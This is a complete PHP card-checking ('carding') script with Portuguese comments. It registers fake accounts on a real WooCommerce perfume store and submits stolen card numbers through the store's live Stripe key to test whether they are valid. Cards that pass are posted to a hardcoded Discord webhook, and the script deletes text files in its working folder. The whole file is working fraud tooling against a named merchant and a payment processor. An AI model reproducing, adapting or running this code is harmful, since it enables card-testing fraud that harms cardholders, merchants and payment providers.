<?php
error_reporting(1);
set_time_limit(0);
date_default_timezone_set('America/Sao_Paulo');

// Webhook Discord
$webhook_url = 'https://discord.com/api/webhooks/1449051729449451701/Z0QECTtV8XQeVJRusaxWeiGagLv5inV4ZedE4WHVthYsVOWaEQX9FhbRPICAR9ryii36';

function sendToDiscord($cartao) {
    global $webhook_url;
    
    // Enviar APENAS o cartão em texto simples
    $data = [
        'content' => $cartao
    ];
    
    $ch = curl_init($webhook_url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    return $response;
}

function getStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

####################################################################

function deletarCookies() {
    if (file_exists("cookies.txt")) {
        unlink("cookies.txt");
    }
}

function deletarTxt() {
    $arquivos = glob("*.txt");
    foreach($arquivos as $arquivo) {
        if(is_file($arquivo)) {
            unlink($arquivo);
        }
    }
}

function deletarArquivoEspecifico($nome_arquivo) {
    if (file_exists($nome_arquivo)) {
        unlink($nome_arquivo);
        return true;
    }
    return false;
}


deletarCookies(); // Deleta apenas cookies.txt


deletarTxt();


deletarArquivoEspecifico("cookies.txt");

####################################################################

$lista = $_GET['lista'];
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];

####################################################################

$bin = substr($cc, 0, 6);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'http://localhost/bin/api.php?bin=' . $bin);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'user-agent: Mozilla/5.0'
));
$lofy = curl_exec($ch);
$bandeira = getStr($lofy, '"Bandeira": "', '"');
$tipo = getStr($lofy, '"Tipo": "', '"');
$nivel = getStr($lofy, '"Nivel": "', '"');
$banco = getStr($lofy, '"Banco": "', '"');
$pais = getStr($lofy, '"Pais": "', '"');
$info = ("$bandeira $tipo $nivel $banco ($pais)");

####################################################################


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.evodiaperfumes.com/myaccount/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookies.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Accept: */*',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
));
$register = curl_exec($ch);
$noncereg = getStr($register, 'name="woocommerce-register-nonce" value="', '"');

$email = '6becklixoso'.rand(10, 100000).'firemail.com.br';

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.evodiaperfumes.com/myaccount/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookies.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Accept: */*',
'content-type: application/x-www-form-urlencoded',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'email=' . $email . '&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_utm_source_platform=%28none%29&wc_order_attribution_utm_creative_format=%28none%29&wc_order_attribution_utm_marketing_tactic=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fwww.evodiaperfumes.com%2F&wc_order_attribution_session_start_time=2025-11-23+20%3A54%3A15&wc_order_attribution_session_pages=2&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F142.0.0.0+Safari%2F537.36&_mc4wp_subscribe_wp-registration-form=0&woocommerce-register-nonce=' . $noncereg . '&_wp_http_referer=%2Fmyaccount%2F&register=Register');
$myaccount = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.evodiaperfumes.com/myaccount/add-payment-method/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookies.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Accept: */*',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
));
$addcard = curl_exec($ch);
$nonce = getStr($addcard, '"createAndConfirmSetupIntentNonce":"', '"');

sleep(2);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookies.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Accept: */*',
'content-type: application/x-www-form-urlencoded',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]=' . $cc . '&card[cvc]=' . $cvv . '&card[exp_year]=' . $ano . '&card[exp_month]=' . $mes . '&allow_redisplay=unspecified&billing_details[address][country]=BR&payment_user_agent=stripe.js%2Fcba824e387%3B+stripe-js-v3%2Fcba824e387%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fwww.evodiaperfumes.com&time_on_page=103225&key=pk_live_51OSJ25Cq9GIzazKwlSWnJtDTfUmR9HugDP83nNjACMdLFvnWMpbweYtCPAzTTkVTd2mDSQ4Xl3V15dzkLjjnQdNq00dgbb7JRo&_stripe_version=2024-06-20');
$stripe = curl_exec($ch);
$stripe_json = json_decode($stripe, true);

// DEBUG: Salvar resposta completa do Stripe
file_put_contents('debug_stripe.txt', $stripe);
error_log("Resposta Stripe: " . $stripe);

if(!$stripe_json || !isset($stripe_json['id']) || empty($stripe_json['id'])) {
  echo "❌ Reprovada - $lista - [ Erro ao criar método de pagamento. ]";
  
  // Mostrar erro específico do Stripe se existir
  if(isset($stripe_json['error']['message'])) {
      echo " - Erro Stripe: " . $stripe_json['error']['message'];
  }
  
  if (file_exists("cookies.txt")) {
      unlink("cookies.txt");
  }
  exit;
}

$id = $stripe_json['id'];

sleep(3);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.evodiaperfumes.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookies.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Accept: application/json, text/javascript, */*; q=0.01',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'X-Requested-With: XMLHttpRequest',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'wc-ajax=wc_stripe_create_and_confirm_setup_intent&action=create_and_confirm_setup_intent&wc-stripe-payment-method=' . $id . '&wc-stripe-payment-type=card&_ajax_nonce=' . $nonce . '');
$resultado = curl_exec($ch);
$resultado_lower = strtolower($resultado);

$aprovada = false;
if(strpos($resultado_lower, '"status":"succeeded"') !== false) {
  $aprovada = true;
  echo "💸 Aprovada - $lista - [ Cartão verificado com sucesso - Success (0000)]";
  
  // ENVIAR PARA DISCORD APENAS QUANDO APROVADO
  sendToDiscord($lista);

}elseif(strpos($resultado_lower, "your card's security code is incorrect") !== false) {
  $aprovada = true;
  echo "💸 Aprovada - $lista - [ Cartão aprovado (CVV incorreto). ]";
  
  // ENVIAR PARA DISCORD APENAS QUANDO APROVADO
  sendToDiscord($lista);

}else{
  // Se não encontrou nenhuma das condições de aprovação, marca como reprovada
  echo "❌ Reprovada - $lista - [ Cartão recusado pelo emissor. ]";
}
if (file_exists("cookies.txt")) {
    unlink("cookies.txt");
}
?>
